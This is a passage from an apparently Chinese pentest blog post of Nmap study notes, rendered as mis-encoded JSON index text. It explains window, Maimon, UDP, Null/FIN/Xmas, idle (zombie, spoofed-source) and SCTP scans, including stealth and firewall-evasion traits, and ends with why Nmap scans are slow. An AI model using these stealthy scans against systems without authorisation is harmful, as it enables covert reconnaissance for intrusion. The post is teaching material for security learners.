â€‹ -sW Windowsæ‰«æï¼Œ â€‹ çª—å£æ‰«æåŸç†ä¸ACKæ‰«æç›¸åŒï¼Œä½†å®ƒä¼šåˆ©ç”¨ç³»ç»Ÿçš„å®ç°ç»†èŠ‚åŒºåˆ†ç«¯å£å¼€æ”¾å’Œå…³é—­ï¼Œè€Œä¸æ˜¯éƒ½æ ‡è®°ä¸º unfilteredã€‚å®ƒä¼šå¯¹RSTæ•°æ®åŒ…çš„TCPçª—å£å€¼è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥çª—å£å­—æ®µä¸º0ï¼Œåˆ™è¯¥ç«¯å£æ ‡è®°ä¸ºclosedï¼Œè‹¥ç«¯å£å­—æ®µé0ï¼Œåˆ™æ ‡è®°ä¸ºopenã€‚ â€‹ è¿™ç§æ‰«ææŠ€æœ¯ä¾èµ–äºéƒ¨åˆ†æ“ä½œç³»ç»Ÿçš„ç‰¹æ€§ï¼Œæ™®éæ€§ä¸é«˜ã€‚æŸäº›ç³»ç»Ÿå¼€æ”¾çš„ç«¯å£ä¸Šçª—å£å¤§å°ä¸ºæ­£æ•°ï¼Œè€Œå…³é—­ç«¯å£åˆ™ä¸º0ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:4","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.5 -sM Maimonæ‰«æ â€‹ -sM Maimonæ‰«æï¼Œä»¥å‘ç°è€…Uriel Maimonå‘½åï¼Œä½¿ç”¨ FIN/ACK æ•°æ®åŒ…ä¸ºæ¢é’ˆã€‚ â€‹ æ ¹æ®RFC 793ï¼ˆTCPï¼‰ï¼Œæ— è®ºç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­éƒ½åº”ç”ŸæˆRSTæ•°æ®åŒ…æ¥å“åº”æ­¤æ¢æµ‹ã€‚ä½†æ˜¯ï¼ŒUrielæ³¨æ„åˆ°ï¼Œå¦‚æœç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œåˆ™è®¸å¤šBSDæ´¾ç”Ÿçš„ç³»ç»Ÿåªä¼šä¸¢å¼ƒè¯¥æ•°æ®åŒ…ï¼ŒNmapå€Ÿæ­¤ç¡®å®šæ‰“å¼€çš„ç«¯å£ã€‚è‹¥æ— å“åº”åŒ…ï¼Œåˆ™æ ‡è®°ä¸º open|filtered ï¼›è‹¥æ”¶åˆ°RSTåŒ…ï¼Œåˆ™ç«¯å£ä¸º closedï¼›è‹¥æ”¶åˆ°ICMPä¸å¯è¾¾æŠ¥é”™ï¼Œåˆ™ç«¯å£ä¸º filteredã€‚ â€‹ ä¸è¿‡åœ¨ç°ä»£ç³»ç»Ÿä¸Šå¾ˆå°‘å‡ºç°è¿™ç§é”™è¯¯ï¼Œä»–ä»¬éƒ½å°†å›å¤RSTæ•°æ®åŒ…ï¼Œå› æ­¤ç”¨å¤„ä¸å¤§ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:5","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.6 -sU UDPæ‰«æ â€‹ -sU UDPæ‰«æï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œæ‰«æä¸Šåƒä¸ªç«¯å£éœ€è¦è‡³å°‘17åˆ†é’Ÿï¼Œå¤šæ•°Linuxç³»ç»Ÿä¼šé™åˆ¶ ICMPå“åº”é€Ÿç‡ã€‚ â€‹ UDPæ‰«æä¼šå‘æŒ‡å®šçš„ç›®æ ‡ç«¯å£å‘é€UDPæ•°æ®åŒ…ï¼Œå¯¹äºå¤§å¤šæ•°ç«¯å£æ­¤æ•°æ®åŒ…ä¸ºç©ºï¼ˆæ— æœ‰æ•ˆè½½è·ï¼‰ï¼Œä½†å¯¹äºä¸€äº›å¸¸è§ç«¯å£ï¼Œå°†å‘é€ç‰¹å®šåè®®çš„æœ‰æ•ˆè½½è·æ•°æ®åŒ…ã€‚æ ¹æ®å“åº”åŒ…çš„å­˜åœ¨ä¸å¦ï¼Œå°†ç«¯å£åˆ†ä¸ºå››ä¸ªçŠ¶æ€ï¼š ç›®æ ‡ç«¯å£çš„ä»»ä½• UDP å“åº” (å¼‚å¸¸) open æœªæ”¶åˆ°è¿”å›ä¿¡æ¯ (å³ä¾¿é‡ä¼ ) open|filtered ICMP ç«¯å£ä¸å¯è¾¾é”™è¯¯ (type 3, code 3) closed å…¶ä»– ICMP ä¸å¯è¾¾é”™è¯¯ (type 3, code 1, 2, 9, 10, or 13) filtered ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:6","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.7 -sN/sF/sX Nullæ‰«æã€FINæ‰«æã€Xmasæ‰«æ â€‹ -sN/sF/sX è®¾ç½®TCPæ ‡å¿—ä½ã€‚è¿™ä¸‰ç§æ‰«æç±»å‹ï¼ˆä»¥åŠâ€“scanflagsé€‰é¡¹ï¼‰åˆ©ç”¨TCP RFC æ ‡å‡†ä¸­çš„ç»†èŠ‚æ¥åŒºåˆ†å¼€æ”¾ç«¯å£å’Œå…³é—­ç«¯å£ï¼Œé€šå¸¸åªèƒ½ç¡®å®šå…³é—­çš„ç«¯å£ã€‚ â€‹ å½“ç›®æ ‡ä¸»æœºç¬¦åˆRFCæ ‡å‡†æ—¶ï¼Œå‘é€ä¸€ä¸ªä¸åŒ…å«SYNï¼ŒRSTï¼ŒACKæ ‡å¿—çš„æ•°æ®åŒ…ï¼Œå½“ç›®çš„ç«¯å£å…³é—­æ—¶å°†è¿”å›RSTåŒ…ï¼Œå½“ç«¯å£å¼€æ”¾æ—¶ç›®æ ‡ä¸»æœºå°†ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œå› æ­¤æ— å“åº”åŒ…ï¼Œä½†ä¹Ÿå¯èƒ½æ˜¯é˜²æŠ¤è®¾å¤‡å¯¼è‡´æ— å“åº”ã€‚å› æ­¤åªè¦ä¸åŒ…å«SYNã€RSTã€ACKè¿™ä¸‰ä¸ªä½ï¼Œåˆ™å…¶ä»–ä¸‰ä¸ªä½ï¼ˆFINï¼ŒPSHå’ŒURGï¼‰çš„ä»»ä½•ç»„åˆéƒ½å¯ä»¥ã€‚ â€‹ -sN ä¸è®¾ç½®ä»»ä½•æ ‡å¿—ä½ï¼› â€‹ -sF åªè®¾ç½®TCP FINä½ï¼ŒFINä½è¡¨ç¤ºå…³é—­è¿æ¥ï¼ˆfinishï¼‰ï¼› â€‹ -sX è®¾ç½®FINã€PSHå’ŒURGæ ‡å¿—ï¼ŒPSHè¡¨ç¤ºæ•°æ®ä¼ è¾“ï¼ˆpush)ï¼ŒURGè¡¨ç¤ºç´§æ€¥ï¼ˆurgentï¼‰ã€‚ â€‹ æ ¹æ®æ‰«æç»“æœï¼Œå°†ç«¯å£åˆ†ä¸ºä¸‰ç§çŠ¶æ€ï¼Œè‹¥æ— å“åº”åŒ…ï¼Œåˆ™æ ‡è®°ç«¯å£çŠ¶æ€ä¸º open|filteredï¼›è‹¥æ”¶åˆ°TCP RSTåŒ…ï¼Œåˆ™ç«¯å£çŠ¶æ€ä¸º closedï¼›è‹¥æ”¶åˆ° ICMPä¸å¯è¾¾é”™è¯¯ï¼ˆtype 3, code 1, 2, 9, 10, or 13)ï¼Œåˆ™æ ‡è®°ç«¯å£çŠ¶æ€ä¸º filteredã€‚ â€‹ è¿™ä¸‰ç§æ‰«æä¼˜ç‚¹åœ¨äºå¯ä»¥è§„é¿éƒ¨åˆ†éçŠ¶æ€é˜²ç«å¢™å’ŒåŒ…è¿‡æ»¤è·¯ç”±è®¾å¤‡ï¼Œè€Œä¸”æ¯”SYNæ›´åŠ éšè”½ï¼›ä½†ç¼ºç‚¹æ˜¯å¹¶éæ‰€æœ‰çš„ç³»ç»Ÿéƒ½éµå¾ªRFC 793æ ‡å‡†ï¼Œè€Œä¸”æ— æ³•åŒºåˆ† open å’Œ filtered ç«¯å£ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:7","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.8 â€“scanflags è‡ªå®šä¹‰æ‰«æ â€‹ â€“scanflags è‡ªå®šä¹‰æ‰«æï¼Œå¯ä»¥å®šåˆ¶åŒ–TCPæ ‡å¿—ä½ï¼ŒåŸç†åŒä¸Šã€‚å¯ä»¥é€šè¿‡è¯¥é€‰é¡¹è®¾ç½® URGã€ACKã€PSHã€RSTã€SYN å’Œ FIN çš„ä»»æ„ç»„åˆï¼Œè¿™ç§å®šåˆ¶åŒ–å¯ä»¥ç”¨æ¥ç ”ç©¶ç»•è¿‡é˜²ç«å¢™è®¾å¤‡ï¼Œè¿™å—æ²¡æœ‰ç ”ç©¶ï¼Œæ¬¢è¿è¯„è®ºã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:8","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.9 -sI ç©ºé—²æ‰«æ â€‹ -sI ç©ºé—²æ‰«æï¼Œä¹Ÿæœ‰ç§°ä¹‹ä¸ºåƒµå°¸æ‰«æï¼Œåˆ©ç”¨åƒµå°¸ä¸»æœºè¿›è¡Œæ‰«æï¼Œä¼˜ç‚¹æ˜¯éšè”½æ€§å¼ºï¼Œç¼ºç‚¹æ˜¯éœ€è¦å…ˆæ‰¾ä¸€å°åˆé€‚çš„åƒµå°¸ä¸»æœºã€‚ç½‘ä¸Šæœ‰æ–‡ç« ã€‚ â€‹ é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼š ç¡®å®šTCPç«¯å£çŠ¶æ€çš„ä¸€ç§æ–¹æ³•æ˜¯å‘é€SYNæ•°æ®åŒ…åˆ°è¯¥ç«¯å£ã€‚è‹¥ç«¯å£å¼€æ”¾ï¼Œåˆ™ç›®æ ‡ä¸»æœºå°†å“åº” SYN / ACKï¼ˆä¼šè¯è¯·æ±‚ç¡®è®¤ï¼‰æ•°æ®åŒ…ï¼›è‹¥ç«¯å£å…³é—­ï¼Œåˆ™ç›®æ ‡ä¸»æœºå°†å“åº”RSTï¼ˆé‡ç½®ï¼‰æ•°æ®åŒ…ã€‚ æ”¶åˆ°æœªç»è¯·æ±‚çš„SYN / ACKæ•°æ®åŒ…çš„è®¡ç®—æœºå°†ä»¥RSTå“åº”ï¼Œæœªç»è¯·æ±‚çš„RSTå°†è¢«å¿½ç•¥ã€‚ æ¯ä¸ªIPæ•°æ®åŒ…éƒ½æœ‰ä¸€ä¸ªç‰‡æ®µæ ‡è¯†å·ï¼ˆIP IDï¼‰ã€‚ç”±äºè®¸å¤šæ“ä½œç³»ç»Ÿå‘é€çš„æ¯ä¸ªæ•°æ®åŒ…æ—¶åªæ˜¯å¢åŠ æ­¤æ•°å­—ï¼Œå› æ­¤æ¢æµ‹IP IDå¯ä»¥å‘Šè¯‰æ”»å‡»è€…è‡ªä¸Šæ¬¡æ¢æµ‹ä»¥æ¥å·²å‘é€äº†å¤šå°‘ä¸ªæ•°æ®åŒ…ã€‚ â€‹ é€šè¿‡ç»„åˆè¿™äº›ç‰¹ç‚¹ï¼Œå¯ä»¥ä¼ªé€ æ‚¨çš„èº«ä»½ï¼ŒåŒæ—¶æ‰«æç›®æ ‡ç½‘ç»œï¼Œä»è€Œçœ‹èµ·æ¥åƒæ˜¯æ— è¾œçš„åƒµå°¸æœºå™¨è¿›è¡Œäº†æ‰«æã€‚ç®€å•æ¥è¯´ï¼Œç©ºé—²æ‰«ææŠ€æœ¯ä¸»è¦æ˜¯è¿›è¡Œä¸‹é¢ä¸‰æ­¥ï¼š æ¢æµ‹åƒµå°¸çš„IP IDå¹¶å°†å…¶è®°å½•ä¸‹æ¥ã€‚ ä¼ªé€ æ¥è‡ªåƒµå°¸çš„SYNæ•°æ®åŒ…ï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ä¸»æœºçš„ç«¯å£ä¸Šã€‚æ ¹æ®ç«¯å£çŠ¶æ€ï¼Œç›®æ ‡çš„ååº”å¯èƒ½ä¼šå¯¼è‡´åƒµå°¸çš„IP IDå¢åŠ ã€‚ å†æ¬¡æ¢æµ‹åƒµå°¸ä¸»æœºçš„IP IDã€‚ç„¶åï¼Œé€šè¿‡å°†æ­¤æ–°IP IDä¸æ­¥éª¤1ä¸­è®°å½•çš„IP IDè¿›è¡Œæ¯”è¾ƒæ¥ç¡®å®šç›®æ ‡ç«¯å£çŠ¶æ€ã€‚è‹¥IDåŠ 2ï¼Œåˆ™ç«¯å£å¼€æ”¾ã€‚ â€‹ è¿™é¡¹æŠ€æœ¯çš„éš¾ç‚¹åœ¨äºå¦‚ä½•æ‰¾åˆ°ä¸€å°åˆé€‚çš„åƒµå°¸ä¸»æœºã€‚è‹¥åƒµå°¸ä¸»æœºæ¯”è¾ƒæ´»è·ƒï¼Œåˆ™IP IDåºåˆ—å·å°†ä¸å‡†ç¡®ï¼Œæ— æ³•åˆ¤æ–­ç«¯å£çŠ¶æ€ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:9","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.10 -sY/sZ SCTP INIT/COOKIE-ECHOæ‰«æ â€‹ -sY/sZ SCTP INIT/COOKIE-ECHOæ‰«æï¼Œè¿™ä¸¤ç§æ‰«ææ–¹å¼æ˜¯åŸºäºSCTPåè®®ã€‚ â€‹ SCTPï¼ˆStream Control Transmission Protocolï¼Œæµæ§åˆ¶ä¼ è¾“åè®®ï¼‰æ˜¯IETFï¼ˆInternet Engineering Task Forceï¼‰åœ¨2000å¹´å®šä¹‰çš„ä¸€ä¸ªä¼ è¾“å±‚åè®®ã€‚SCTPå¯ä»¥çœ‹ä½œæ˜¯TCPåè®®çš„æ”¹è¿›ï¼Œå®ƒæ”¹è¿›äº†TCPçš„ä¸€äº›ä¸è¶³ã€‚å®ƒä¸€ç§æä¾›äº†å¯é ã€é«˜æ•ˆã€æœ‰åºçš„æ•°æ®ä¼ è¾“åè®®ã€‚ç›¸æ¯”ä¹‹ä¸‹TCPæ˜¯é¢å‘å­—èŠ‚çš„ï¼Œè€ŒSCTPæ˜¯é’ˆå¯¹æˆå¸§çš„æ¶ˆæ¯ã€‚RFC 4960è¯¦ç»†åœ°å®šä¹‰äº†SCTPï¼Œä»‹ç»æ€§çš„æ–‡æ¡£æ˜¯RFC 3286ã€‚ â€‹ TCPå»ºç«‹è¿æ¥çš„è¿‡ç¨‹æ˜¯ï¼šSYNã€SYN/ACKã€ACKï¼› â€‹ è€ŒSCTPå»ºç«‹è¿æ¥çš„è¿‡ç¨‹æ˜¯ï¼šINITã€INIT-ACKã€COOKIE-ECHOã€COOKIE-ACK â€‹ ä¸»æœºå‘ç°é˜¶æ®µçš„ -PY é€‰é¡¹ä¸ -sY åŸç†ä¸€æ ·ï¼Œé€šè¿‡å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ INITæ•°æ®åŒ…ï¼Œæ ¹æ®ä¸»æœºå“åº”åˆ¤æ–­æ˜¯å¦å­˜æ´»ã€‚ â€‹ -sY/sZ ä¸TCPåè®®ä¸‹çš„ -sS/sAï¼Œæ€æƒ³æ˜¯ä¸€è‡´çš„ã€‚ -sY SCTP INITæ‰«ææ˜¯TCP SYNæ‰«æçš„SCTPç­‰æ•ˆç‰©ã€‚ä¼˜ç‚¹æ˜¯é€Ÿåº¦å¿«ï¼Œä¸å—é™åˆ¶æ€§é˜²ç«å¢™çš„é™åˆ¶ã€‚ä¸SYNæ‰«æä¸€æ ·ï¼ŒINITæ‰«æç›¸å¯¹éšè”½ï¼Œå› ä¸ºå®ƒæ°¸è¿œä¸ä¼šå®ŒæˆSCTPè¿æ¥ã€‚èƒ½æœ‰æ•ˆåŒºåˆ†å¼€å¯ï¼Œå…³é—­å’Œè¿‡æ»¤çŠ¶æ€ã€‚ â€‹ -sZ SCTP COOKIE-ECHOæ‰«æï¼Œåˆ©ç”¨äº†SCTPåè®®åœ¨å®ç°ä¸Šï¼Œè‹¥å‘å¼€æ”¾çš„ç«¯å£å‘é€COOKIE-ECHOè¯·æ±‚ï¼Œåˆ™è¯¥ç«¯å£ä¼šç›´æ¥ä¸¢å¼ƒè¯¥æ•°æ®åŒ…ä¸åšå“åº”ï¼›è€Œå¯¹å…³é—­çš„ç«¯å£ï¼Œåˆ™ç›®æ ‡ä¸»æœºä¼šè¿”å›ABORTå“åº”ã€‚åŒæ ·ä¹Ÿå¯ä»¥ç”¨äºæ£€æµ‹åŸºäºçŠ¶æ€æ£€æµ‹çš„é˜²ç«å¢™ã€‚ç¼ºç‚¹æ˜¯ä¸èƒ½åŒºåˆ†æ‰“å¼€å’Œè¿‡æ»¤çš„ç«¯å£ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:10","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.11 -sO åè®®æ‰«æ â€‹ -sO IPå±‚åè®®æ‰«æï¼Œè¿™ä¸ç®—æ˜¯ç«¯å£æ‰«ææŠ€æœ¯ï¼Œè¯¥æ‰«ææŠ€æœ¯ç”¨äºåˆ¤æ–­ç›®æ ‡ä¸»æœºæ‰€æ”¯æŒçš„åè®®ã€‚ â€‹ è¯¥æ‰«ææŠ€æœ¯å…è®¸ç”¨æˆ·é€šè¿‡-pé€‰æ‹©æ‰«æçš„åè®®å·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨-Fæ‰«ænmap-protocolsæ–‡ä»¶ä¸­çš„æ‰€æœ‰åè®®ï¼ˆå…±145ç§åè®®ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šæ‰«æ256ä¸ªå¯èƒ½çš„å€¼ï¼Œä»¥å¸¸è§„ç«¯å£è¡¨æ ¼å½¢å¼æŠ¥å‘Šç»“æœã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:11","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.12 -b FTP bounce scan â€‹ -b FTP bounce scanï¼Œé€æ¸å¼ƒç”¨ â€‹ è¿™ç§æ‰«ææŠ€æœ¯æ˜¯åˆ©ç”¨FTPæœåŠ¡å™¨çš„åŠŸèƒ½ã€‚FTPåè®®ï¼ˆRFC 959ï¼‰çš„ä¸€ä¸ªæœ‰è¶£åŠŸèƒ½æ˜¯æ”¯æŒæ‰€è°“çš„ä»£ç†FTPè¿æ¥ã€‚è¿™ä½¿ç”¨æˆ·å¯ä»¥è¿æ¥åˆ°ä¸€ä¸ªFTPæœåŠ¡å™¨ï¼Œç„¶åè¦æ±‚å°†æ–‡ä»¶å‘é€åˆ°ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚åœ¨è®¸å¤šçº§åˆ«ä¸Šï¼Œè¿™ç§åŠŸèƒ½å·²ç»å¾ˆå®¹æ˜“è¢«æ»¥ç”¨ï¼Œå…¶ä¸­ä¹‹ä¸€æ˜¯å¯¼è‡´FTPæœåŠ¡å™¨å¯¹å…¶ä»–ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€‚å› æ­¤å¤§å¤šæ•°FTPæœåŠ¡å™¨éƒ½ä¸å†æ”¯æŒè¯¥åŠŸèƒ½ï¼Œæ‰€ä»¥è¿™é¡¹æ‰«ææŠ€æœ¯ä¹ŸåŸºæœ¬å¼ƒç”¨äº†ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:12","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.13 ç»„åˆåˆ©ç”¨ â€‹ æœ‰æ—¶å€™éœ€è¦é€šè¿‡å¤šç§æ‰«ææŠ€æœ¯æ¥å¯¹ç¡®å®šç«¯å£çŠ¶æ€ã€‚ä¾‹å¦‚ï¼š â€‹ å…ˆæ‰§è¡ŒFINæ‰«æï¼ŒNmapä¼šæ‰¾åˆ°å…³é—­çš„ç«¯å£ï¼ŒåŒæ—¶åˆ—å‡º 39ä¸ªç«¯å£ä¸ºâ€œopen|filteredâ€ï¼›ç„¶åå†å¯¹è¿™39ä¸ªç«¯å£è¿›è¡ŒACKæ‰«æï¼Œå…¶ä¸­æœ‰2ä¸ªä¸ºfilteredï¼Œå…¶ä»–37ä¸ªå¤„äºæœªè¿‡æ»¤çŠ¶æ€æ„å‘³ç€openæˆ–closedã€‚å¦‚æœä¸€ç§æ‰«æç±»å‹å°†ç«¯å£æ ‡è¯†ä¸ºopenæˆ–filtered ï¼Œå¦ä¸€ç§æ‰«æç±»å‹å°†å…¶æ ‡è¯†ä¸ºopenæˆ–closedï¼Œé‚£ä¹ˆè¯¥ç«¯å£å¿…é¡»ä¸ºæ‰“å¼€çŠ¶æ€ã€‚é€šè¿‡ç»„åˆè¿™ä¸¤ç§æ‰«æç±»å‹ï¼Œæˆ‘ä»¬äº†è§£åˆ°æœ‰37ä¸ªç«¯å£å¼€æ”¾ï¼Œä¸¤ä¸ªå·²è¿‡æ»¤ï¼Œè€Œ961å·²å…³é—­ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:13","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x05 Nmapé«˜æ•ˆæ‰«æç­–ç•¥ â€‹ Nmapçš„æ‰«æé€Ÿåº¦æ…¢ä¸€ç›´è¢«äººè¯Ÿç—…ï¼Œé¦–å…ˆåˆ†æä¸€ä¸‹Nmapæ‰«ææ…¢å¯èƒ½çš„åŸå› ï¼Œå†æ ¹æ®NNS ç¬¬å…­ç«  ä¼˜åŒ–Nmapè¡¨ç°å’Œå¹³æ—¶çš„ä½¿ç”¨å¿ƒå¾—ç»™å‡ºä¸€äº›å»ºè®®ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.1 Nmapæ…¢åœ¨å“ªï¼Ÿ â€‹ Nmapæ‰«æçš„æ…¢ï¼Œä¸€éƒ¨åˆ†æ˜¯å› ä¸ºå…¶æ‰«æç®—æ³•ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯éƒ¨åˆ†é«˜çº§åŠŸèƒ½çš„åŸå› ã€‚ä»¥ä¸‹æ˜¯æˆ‘è®¤ä¸ºå¯èƒ½å¯¼è‡´Nmapæ…¢çš„åŸå› ï¼š ç½‘ç»œçŠ¶æ€ç›‘æµ‹ï¼ˆæ‹¥å¡æ§åˆ¶ï¼‰ Nmapæä¾›ç½‘ç»œçŠ¶æ€ç›‘æµ‹ï¼ŒNmapä¼šåŸºäºç½‘ç»œçŠ¶æ€é€‚å½“çš„è°ƒæ•´æ‰«æé€Ÿåº¦ï¼Œä»¥ä¿æŒç½‘ç»œå…è®¸çš„é€Ÿåº¦ã€‚Nmap ä½¿ç”¨ä¸‰ç§æ¨¡ä»¿ TCP çš„ç®—æ³•æ¥æ§åˆ¶æ‰«æçš„æ¿€è¿›ç¨‹åº¦ï¼šæ‹¥å¡çª—å£ã€æŒ‡æ•°é€€é¿å’Œæ…¢å¯åŠ¨ã€‚æ‹¥å¡çª—å£æ§åˆ¶ Nmap ä¸€æ¬¡å¯èƒ½æœ‰å¤šå°‘ä¸ªæœªå®Œæˆçš„æ¢æµ‹ã€‚è‹¥çª—å£å·²æ»¡ï¼Œåˆ™ä¸å†å‘é€ï¼Œç›´åˆ°æ”¶åˆ°å“åº”æˆ–æ¢æµ‹è¶…æ—¶ã€‚å½“ Nmap æ£€æµ‹åˆ°ä¸¢å¼ƒçš„æ•°æ®åŒ…æ—¶ï¼ŒæŒ‡æ•°é€€é¿ä¼šå¯¼è‡´ Nmap æ˜¾ç€å˜æ…¢ã€‚æ¯å½“æ£€æµ‹åˆ°ä¸¢å¼ƒæ—¶ï¼Œæ‹¥å¡çª—å£é€šå¸¸ä¼šå‡å°‘åˆ° 1ã€‚æ…¢å¯åŠ¨åˆ™ç”¨äºé€æ¸æé«˜æ‰«æé€Ÿåº¦ä»¥ç¡®å®šç½‘ç»œçš„æ€§èƒ½é™åˆ¶ã€‚ æ‹¥å¡çª—å£å’Œé˜ˆå€¼ï¼š è‡ªé€‚åº”é‡ä¼  æœ€ç®€å•çš„æ‰«æä»ªï¼ˆå’Œæ— çŠ¶æ€çš„ï¼‰ é€šå¸¸æ ¹æœ¬ä¸é‡ä¼ æ¢æµ‹ã€‚å¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°ä¸¢åŒ…ï¼ŒNmap å¯èƒ½åªåœ¨æ”¶åˆ°æ¢æµ‹å“åº”å¤±è´¥æ—¶é‡ä¼ ä¸€æ¬¡ã€‚å½“å‡ºç°å¤§é‡ä¸¢åŒ…ç°è±¡æ—¶ï¼ŒNmap å¯èƒ½ä¼šé‡ä¼ åæ¬¡æˆ–æ›´å¤šæ¬¡ã€‚è¿™å…è®¸ Nmap å¿«é€Ÿæ‰«æå¿«é€Ÿã€å¯é ç½‘ç»œä¸Šçš„ä¸»æœºï¼ŒåŒæ—¶åœ¨æ‰«ææœ‰é—®é¢˜çš„ç½‘ç»œæˆ–æœºå™¨æ—¶ä¿æŒå‡†ç¡®æ€§ï¼ˆä»¥ç‰ºç‰²ä¸€äº›é€Ÿåº¦ä¸ºä»£ä»·ï¼‰ã€‚å½“è¾¾åˆ°æŸä¸ªé˜ˆå€¼æ—¶ï¼ŒNmapæ‰ä¼šæ”¾å¼ƒé‡ä¼ ã€‚ æ‰«æå»¶è¿Ÿ æ•°æ®åŒ…å“åº”é€Ÿç‡é™åˆ¶å¯èƒ½æ˜¯ Nmap ç­‰ç«¯å£æ‰«æå™¨é¢ä¸´çš„æœ€ä¸¥é‡çš„é—®é¢˜ã€‚å½“ç›®æ ‡ä¸»æœºå­˜åœ¨æ•°æ®åŒ…å“åº”é€Ÿç‡é™åˆ¶æ—¶ï¼ŒNmapä¼šè¯•å›¾æ£€æµ‹è¿™ç§æƒ…å†µï¼Œå¯ç”¨æ‰«æå»¶è¿Ÿï¼Œå®ƒä¼šåœ¨å‘é€åˆ°å•ä¸ªç›®æ ‡çš„æ¯ä¸ªæ¢æµ‹ä¹‹é—´å®ç°çŸ­å»¶è¿Ÿï¼ˆä½è‡³ 5 æ¯«ç§’ï¼‰ã€‚å¦‚æœæ•°æ®åŒ…å“åº”é€Ÿç‡ä¾ç„¶åœ¨ä¸‹é™ï¼ŒNmap å°†ç»§ç»­å°†å»¶è¿ŸåŠ å€ï¼Œç›´åˆ°ä¸‹é™åœæ­¢æˆ– Nmap è¾¾åˆ°å…è®¸çš„æœ€å¤§æ‰«æå»¶è¿Ÿã€‚ 